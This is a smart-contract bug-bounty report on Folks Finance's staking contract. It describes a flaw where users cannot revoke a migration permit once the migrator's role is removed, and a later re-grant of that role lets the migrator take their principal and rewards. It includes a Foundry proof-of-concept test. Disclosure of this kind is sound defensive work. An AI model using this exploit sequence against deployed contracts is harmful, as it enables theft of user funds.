# 69097 sc low broken migration permit revocation allows a re authorized migrator to transfer user principal and rewards without fresh consent

**Submitted on Mar 12th 2026 at 20:06:11 UTC by @DSbeX for** [**Audit Comp | Folks Finance: Staking Contracts**](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #69097
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Brief/Intro

The migration permission model contains a revocation flaw that can lead to unauthorized transfer of user funds. A user can approve a migrator while it holds `MIGRATOR_ROLE`, but if that role is later removed from the migrator address, the user can no longer revoke the previously granted approval because `setMigrationPermit()` still requires the target to currently hold `MIGRATOR_ROLE`, even when setting the permit to false. The stale approval remains stored and becomes usable again if the same address later regains `MIGRATOR_ROLE`, at which point the migrator can call `migratePositionsFrom()` and receive the user’s remaining principal and reward directly, without fresh user consent. It needs role so it doesn't deserve Critical, I believe it best fits High.

## Vulnerability Details

The issue is in `setMigrationPermit()`:

```solidity
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
    if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);

    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
    emit MigrationPermitUpdated(_migrator, msg.sender, _isMigrationPermitted);
}
```

The role check is unconditional. It applies not only when a user is granting a permit, but also when the user is trying to revoke an existing permit by setting it to `false`.

This creates the following vulnerable state transition:

1. A migrator address `M` holds `MIGRATOR_ROLE`.
2. A user sets `migrationPermits[M][user] = true`.
3. Later, `MIGRATOR_ROLE` is revoked from `M`.
4. The user attempts to revoke the approval with:

```solidity
setMigrationPermit(M, false)
```

5. The call reverts with `MigratorNotFound(M)` because `M` no longer currently holds the role.
6. The previous `true` value remains stored in `migrationPermits[M][user]`.
7. If `M` later regains `MIGRATOR_ROLE`, the old approval becomes usable again without any fresh action by the user.

The migration function only checks:

* that `msg.sender` currently has `MIGRATOR_ROLE`
* that `migrationPermits[msg.sender][user] == true`

```solidity
function migratePositionsFrom(address user)
    external
    nonReentrant
    onlyRole(MIGRATOR_ROLE)
    returns (UserStake[] memory)
{
    if (!migrationPermits[msg.sender][user]) revert MigratorNotPermitted(msg.sender, user);
    ...
    TOKEN.safeTransfer(msg.sender, unclaimedUserAmount + unclaimedUserRewards);
}
```

The key security consequence is that the tokens are transferred directly to `msg.sender`:

```solidity
TOKEN.safeTransfer(msg.sender, unclaimedUserAmount + unclaimedUserRewards);
```

As a result, once the stale permit becomes active again, the re-authorized migrator can directly receive custody of the user’s principal and reward.

This is not about migration of locked positions being allowed. The protocol explicitly supports migration of open positions. The issue is that a user cannot reliably revoke prior consent, and stale consent can later be reused to move funds.

## Impact Details

This vulnerability can lead to direct unauthorized transfer of user funds for users who previously approved a migrator address.

Once the stale permit is reactivated by role re-grant, the migrator can call `migratePositionsFrom(user)` and receive:

* all unclaimed principal
* all unclaimed rewards

This is not limited to unclaimed yield. The transfer includes user principal as well.

## References

`setMigrationPermit(address _migrator, bool _isMigrationPermitted)` - <https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L77>

## Proof of Concept

{% stepper %}
{% step %}

### Alice approves `migrator`

```solidity
vm.prank(alice);
staking.setMigrationPermit(migrator, true);
assertEq(staking.migrationPermits(migrator, alice), true);
```

{% endstep %}

{% step %}

### Admin revokes `MIGRATOR_ROLE` from `migrator`

```solidity
bytes32 migratorRole = staking.MIGRATOR_ROLE();

vm.prank(admin);
staking.revokeRole(migratorRole, migrator);
assertEq(staking.hasRole(migratorRole, migrator), false);
```

{% endstep %}

{% step %}

### Alice attempts to revoke the permit, but the call reverts

```solidity
vm.expectRevert(abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, migrator));
vm.prank(alice);
staking.setMigrationPermit(migrator, false);
```

{% endstep %}

{% step %}

### The stale `true` approval remains stored

```solidity
assertEq(staking.migrationPermits(migrator, alice), true);
```

{% endstep %}

{% step %}

### Admin grants `MIGRATOR_ROLE` back to the same address

```solidity
vm.prank(admin);
staking.grantRole(migratorRole, migrator);
assertEq(staking.hasRole(migratorRole, migrator), true);
```

{% endstep %}

{% step %}

### The old approval silently becomes usable again without fresh user consent

```solidity
assertEq(staking.migrationPermits(migrator, alice), true);

vm.prank(migrator);
IStakingV1.UserStake[] memory migratedStakes = staking.migratePositionsFrom(alice);

assertEq(migratedStakes.length, 1);
assertEq(migratedStakes[0].amount, 10 ether);
assertEq(staking.getUserStakes(alice).length, 0);
```

{% endstep %}

{% step %}

### The migrator directly receives Alice's remaining principal + reward

```solidity
assertEq(token.balanceOf(migrator), migratedStakes[0].amount + migratedStakes[0].reward);
```

{% endstep %}
{% endstepper %}

```solidity
function test_Migration_StalePermitCannotBeRevokedWhenRoleRemoved_AndReactivatesOnRegrant() public {
    deal(address(token), address(staking), 1000 ether);
    deal(address(token), alice, 100 ether);

    uint8 periodIndex = addStakingPeriodByManager(50 ether, 20, 10, 5000, true);
    approveAndStake(alice, periodIndex, 10 ether, 20, 10, 5000, address(0));
    assertEq(staking.getUserStakes(alice).length, 1);

    // Alice opts in to this migrator
    vm.prank(alice);
    staking.setMigrationPermit(migrator, true);
    assertEq(staking.migrationPermits(migrator, alice), true);

    bytes32 migratorRole = staking.MIGRATOR_ROLE();

    // Migrator loses the role
    vm.prank(admin);
    staking.revokeRole(migratorRole, migrator);
    assertEq(staking.hasRole(migratorRole, migrator), false);

    // Alice now tries to revoke the permit, but cannot because the target no longer has MIGRATOR_ROLE
    vm.expectRevert(abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, migrator));
    vm.prank(alice);
    staking.setMigrationPermit(migrator, false);

    // The stale approval remains stored
    assertEq(staking.migrationPermits(migrator, alice), true);

    // Later, the same address regains MIGRATOR_ROLE
    vm.prank(admin);
    staking.grantRole(migratorRole, migrator);
    assertEq(staking.hasRole(migratorRole, migrator), true);

    // The old approval silently becomes usable again without fresh user consent
    assertEq(staking.migrationPermits(migrator, alice), true);

    vm.prank(migrator);
    IStakingV1.UserStake[] memory migratedStakes = staking.migratePositionsFrom(alice);

    assertEq(migratedStakes.length, 1);
    assertEq(migratedStakes[0].amount, 10 ether);
    assertEq(staking.getUserStakes(alice).length, 0);

    // Proof that the migrator directly received Alice's remaining principal + reward
    assertEq(token.balanceOf(migrator), migratedStakes[0].amount + migratedStakes[0].reward);
}
```
